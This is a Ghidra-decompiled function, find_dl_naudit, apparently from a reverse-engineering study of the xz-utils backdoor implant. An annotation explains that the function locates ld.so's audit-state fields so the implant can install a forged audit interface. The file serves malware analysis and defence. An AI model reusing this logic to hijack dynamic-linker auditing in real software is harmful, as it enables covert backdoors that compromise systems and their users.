// /home/kali/xzre-ghidra/xzregh/104370_find_dl_naudit.c
// Function: find_dl_naudit @ 0x104370
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_dl_naudit(elf_info_t * dynamic_linker_elf, elf_info_t * libcrypto_elf, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Matches the `_dl_naudit` and `_dl_audit` references inside ld.so, records their offsets within `__rtld_global_ro`, and resolves a few extra crypto routines. Those offsets let the implant point ld.so's global audit state at its forged interface.
 */
#include "xzre_types.h"


BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
                   backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  Elf64_Addr EVar1;
  Elf64_Ehdr *pEVar2;
  Elf64_Xword EVar3;
  _func_64 *code_start;
  BOOL BVar4;
  Elf64_Sym *pEVar5;
  char *str;
  Elf64_Sym *pEVar6;
  u8 *puVar7;
  uchar *puVar8;
  lzma_allocator *allocator;
  _func_44 *p_Var9;
  uint *puVar10;
  _func_34 *p_Var11;
  long lVar12;
  u8 **ppuVar13;
  u8 *code_start_00;
  uint *mem_address;
  byte bVar14;
  EncodedStringId local_8c;
  u64 local_88;
  u8 *local_80;
  u64 local_78;
  undefined1 local_6f;
  undefined1 local_65;
  undefined4 local_64;
  uint *local_50;
  byte local_30;
  
  bVar14 = 0;
  local_8c = 0;
  local_88 = 0;
  pEVar5 = elf_symbol_get(dynamic_linker_elf,STR_rtld_global_ro,0);
  if (pEVar5 != (Elf64_Sym *)0x0) {
    local_8c = STR_GLRO_dl_naudit_naudit;
    str = elf_find_string(dynamic_linker_elf,&local_8c,(void *)0x0);
    if (str != (char *)0x0) {
      pEVar6 = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
      puVar7 = (u8 *)elf_get_code_segment(dynamic_linker_elf,&local_88);
      if ((puVar7 != (u8 *)0x0) &&
         (puVar7 = find_string_reference(puVar7,puVar7 + local_88,str), puVar7 != (u8 *)0x0)) {
        if (pEVar6 != (Elf64_Sym *)0x0) {
          EVar1 = pEVar6->st_value;
          pEVar2 = libcrypto_elf->elfbase;
          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          imported_funcs->DSA_get0_pqg = (_func_33 *)(pEVar2->e_ident + EVar1);
        }
        ppuVar13 = &local_80;
        for (lVar12 = 0x16; lVar12 != 0; lVar12 = lVar12 + -1) {
          *(undefined4 *)ppuVar13 = 0;
          ppuVar13 = (u8 **)((long)ppuVar13 + (ulong)bVar14 * -8 + 4);
        }
        puVar8 = dynamic_linker_elf->elfbase->e_ident + pEVar5->st_value;
        EVar3 = pEVar5->st_size;
        allocator = get_lzma_allocator();
        allocator->opaque = libcrypto_elf;
        p_Var9 = (_func_44 *)lzma_alloc(0xd10,allocator);
        imported_funcs->EVP_MD_CTX_free = p_Var9;
        if (p_Var9 != (_func_44 *)0x0) {
          imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
        }
        mem_address = (uint *)0x0;
        code_start_00 = puVar7 + -0x80;
        while (code_start_00 < puVar7) {
          BVar4 = find_instruction_with_mem_operand_ex
                            (code_start_00,puVar7,(dasm_ctx_t *)&local_80,0x10b,(void *)0x0);
          code_start_00 = code_start_00 + 1;
          if (BVar4 != 0) {
            if ((local_6f & 1) != 0) {
              puVar10 = local_50;
              if ((local_64 & 0xff00ff00) == 0x5000000) {
                puVar10 = (uint *)((u8 *)((long)local_50 + (long)local_80) + local_78);
              }
              if ((((local_65 & 0x48) != 0x48) && (puVar8 < puVar10)) &&
                 (puVar10 + 1 <= puVar8 + EVar3)) {
                mem_address = puVar10;
              }
            }
            code_start_00 = local_80 + (ulong)local_30 + 1;
          }
        }
        if ((mem_address == (uint *)0x0) ||
           (code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt,
           BVar4 = find_instruction_with_mem_operand_ex
                             ((u8 *)code_start,
                              (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                              (dasm_ctx_t *)0x0,0x10b,mem_address), BVar4 == 0)) {
          p_Var11 = (_func_34 *)imported_funcs->EVP_MD_CTX_free;
        }
        else {
          p_Var11 = (_func_34 *)lzma_alloc(0x468,allocator);
          imported_funcs->DSA_get0_pub_key = p_Var11;
          if (p_Var11 != (_func_34 *)0x0) {
            imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
          }
          if ((*mem_address == 0) && (*(long *)(mem_address + -2) == 0)) {
            (hooks->ldso_ctx)._dl_naudit_ptr = mem_address;
            (hooks->ldso_ctx)._dl_audit_ptr = (audit_ifaces **)(mem_address + -2);
            return 1;
          }
          lzma_free(imported_funcs->EVP_MD_CTX_free,allocator);
          p_Var11 = imported_funcs->DSA_get0_pub_key;
        }
        lzma_free(p_Var11,allocator);
      }
    }
  }
  return 0;
}

